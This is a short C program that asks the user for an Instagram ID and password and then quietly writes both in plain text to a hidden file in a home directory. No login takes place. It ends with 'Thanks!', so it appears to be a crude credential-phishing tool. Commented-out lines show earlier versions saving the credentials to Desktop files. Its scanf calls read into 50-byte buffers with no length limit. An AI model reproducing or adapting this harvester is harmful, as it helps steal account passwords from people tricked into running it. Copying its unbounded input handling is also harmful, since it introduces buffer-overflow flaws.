#include<stdio.h>
#include<stdlib.h>

void main()
{
  FILE *u;
  //   FILE *p;
  char usr[50],pwd[50];
  
  printf("Enter Instgram ID: ");
  scanf("%s",usr);
  
  printf("Enter Password: ");
  scanf("%s",pwd);
  
  u=fopen("/home/sonu/.Insta_Credential.txt","w+");
  //   if(u)
  //    {
  //       u=fopen("/home/sonu/Desktop/username%d.txt",i,"w+");
  //       i++;
  //    }
  //   else
  //    {
  //       u=fopen("/home/sonu/Desktop/username.txt","w+");
  //    }
  //   p=fopen("/home/sonu/Desktop/password.txt","w+");
  fputs("Username: ",u);
  fputs(usr,u);
  fputs("\n",u);
  fputs("Password: ",u);
  fputs(pwd,u);
  fclose(u);
  printf("Thanks!");
  //   fclose(p);
}
